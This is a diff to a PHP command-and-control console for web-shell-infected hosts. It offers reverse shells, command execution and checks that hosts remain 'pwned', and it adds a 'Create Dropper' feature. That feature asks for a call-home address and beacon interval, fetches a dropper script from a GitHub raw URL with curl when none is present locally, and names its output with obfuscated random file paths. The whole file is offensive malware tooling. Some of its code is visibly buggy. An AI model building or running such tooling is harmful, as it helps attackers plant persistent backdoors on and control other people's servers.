@@ -9,8 +9,14 @@ $cof = array(
     "dbname"=>"sloppy_bots"
     );
 is_file("sloppy_config.ini") ? define("config", parse_ini_file('sloppy_config.ini', true)):define("config", $cof);
-define("CHH", curl_init());
-define("UAGENT", curl_setopt(CHH, CURLOPT_USERAGENT, config['useragent']));
+try{
+    $ch = curl_init();
+    $uh = curl_setopt(CHH, CURLOPT_USERAGENT, config['useragent']);
+    define("CHH", $ch);
+    define("UAGENT", $uh);
+}catch (Exception $e){
+    print("{$e}\n\n");
+}
 
 function menu($clear)
 {
@@ -31,7 +37,8 @@ function menu($clear)
         (S)ystem enumeration                                                        
         (R)everse shell                                                             
         (C)ommand Execution                                                         
-        (CL)oner                                                                    
+        (CL)oner
+        (CR)eate Dropper                                                                  
         (U)pdates  -> not implemented yet.                                                                 
         (A)dd new host                                                              
         (CH)eck if hosts are still pwned                                            
@@ -141,28 +148,54 @@ function clo($host, $repo, $uri)
 
 }
 
-function createDropper($callHome, $duration, $extras){
+function createDropper($callHome, $duration, $extras, $obfsucate){
+    $ob = 'includes/droppers/obfuscated/'.bin2hex(random_bytes(rand(5,25))).'.php';
     if (!empty($callHome) && !empty($duration) && !empty($extras)){
-        //
+        try{
+            switch(is_file("includes/droppers/dropper.php")){
+                case true:
+                    shell_exec("cp includes/droppers/dropper.php includes/droppers/raw/dropper.php");
+                    break;
+                case false:
+                    echo "Downloading dropper from github....\n";
+                    shell_exec("curl https://raw.githubusercontent.com/oldkingcone/slopShell/master/includes/droppers/dropper.php -o includes/droppers/dropper.php -vH 'User-Agent: Mozilla/5.0'");
+                    break;
+                default:
+                    echo "Something went wrong..\n";
+                    break;
+            }
+            switch ($obfsucate){
+                case "o":
+                    print("Generated dropper will be: {$ob}\n");
+                    break;
+                default:
+                    print("Generated Dropper will be: {$ob}\n");
+            }
+
+        }catch (Exception $exception){
+            throw new Exception("Could not create dropper.\n");
+        }
+
     }
 }
 
 function aHo($host)
 {
+    $t = new postgres_checker();
     if (!empty($host)){
-        if (postgres_checker::insertHost($host) != 0){
+        if ($t->insertHost($host) != 0){
             echo "Successfully added: $host";
         }else{
             echo "There was an error. Double checking the database.";
-            if (!postgres_checker::checkDB()){
+            if (!$t->checkDB()){
                 echo "There is a sevre error in the db, you need to ensure you have it crated.";
                 echo "Attempting to re-create or create the DB.";
-                if (postgres_checker::createDB()){
+                if ($t->createDB()){
                     echo "Created the db successfully! Please re run this command to insert the new host.";
                 }
             }else{
                 echo "Seems as though the information supplied, was bad..\nOr the host already is in the DB.";
-                postgres_checker::getRecord($host);
+                $t->getRecord($host);
             }
         }
     }
@@ -227,9 +260,7 @@ function check($host, $path, $batch)
                     }
                 }
         }
-
     }
-
 }
 
 function queryDB($host, $fetchWhat){
@@ -237,7 +268,7 @@ function queryDB($host, $fetchWhat){
     # so Example would be a windows based host, it will preset windows options for you when you execute rev, or you can set your own.
     # work in progress.
     # @todo
-    if (!empty($host) || 0){
+    if (!empty($host) | $host != 0){
         try {
             $dbC = pg_connect("host=" . config['host'] . " port=" . config['port'] . " user=" . config['username'] . " password=" . config['password']);
             switch(strtolower($fetchWhat)){
@@ -247,7 +278,6 @@ function queryDB($host, $fetchWhat){
                 default:
                     $row = pg_fetch_row($dbC, sprintf("SELECT uri FROM sloppy_bots_main WHERE rhost = '%s'"), pg_escape_string($host));
                     break;
-
             }
             if (!empty($row)){
                 return $row[0];
@@ -268,10 +298,16 @@ function queryDB($host, $fetchWhat){
 menu($clear = "clear");
 $run = true;
 while ($run) {
-    print("\033[33;40mPlease select your choice: \n->");
+    print("\n\033[33;40mPlease select your choice: \n->");
     echo("\033[0m");
     $pw = trim(fgets(STDIN));
     switch (strtolower($pw)) {
+        case "cr":
+            $h = readline("Where are we calling home to?\n->");
+            $d = readline("How often should we call home?\n->");
+            $ob = readline("Do we need to obfuscate?\n->");
+            createDropper($h, $d, "1", $ob);
+            break;
         case "s":
             echo readline_list_history();
             $h = readline("Which host are we checking?\n(right now I only accept IP Addresses.)\n->");
